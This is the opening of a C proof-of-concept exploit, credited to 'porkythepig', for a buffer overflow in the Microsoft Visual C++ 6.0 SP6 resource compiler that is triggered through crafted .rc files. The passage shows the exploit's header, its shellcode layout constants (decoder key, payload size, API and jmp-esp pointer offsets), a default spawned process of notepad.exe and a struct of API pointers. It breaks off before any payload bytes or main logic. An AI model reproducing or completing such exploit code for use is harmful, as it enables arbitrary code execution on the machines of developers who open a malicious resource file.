//*****************
//
//  Microsoft Visual C++ 6.0 SP6 resource compiler buffer overflow 
//  vulnerability .rc resource files exploit 
//
//  vulnerability found / exploit built by porkythepig
//
//*****************

#include "stdio.h"
#include "stdlib.h"
#include "memory.h"

#define STR01 "Microsoft Visual Studio 6.0 SP6 .rc PoC exploit by porkythepig"
#define DEF_SPAWNED_PROCESS "notepad.exe"
#define EXPL_SIZE 283
#define DEC_CODE 0xBC
#define DEC_CODE_OFFSET 0x2D
#define ENC_SIZE_OFFSET 0x3E
#define SHIFT 0x40
#define SHIFT_DEC_OFFSET 0x35
#define PROC_NAME_OFFSET 0x107
#define GETSTAR_OFFSET 0x11
#define CREPRO_OFFSET 0x6d
#define GETWINDIR_OFFSET 0x25
#define ESPSUB_OFFSET 0x08
#define FNAMSHIFT_OFFSET 0x02

typedef struct
{
	unsigned int getStarInf;
	unsigned int crePro;
	unsigned int getWinDir;
	unsigned int jmpEspPtr;
}ApiPtrs;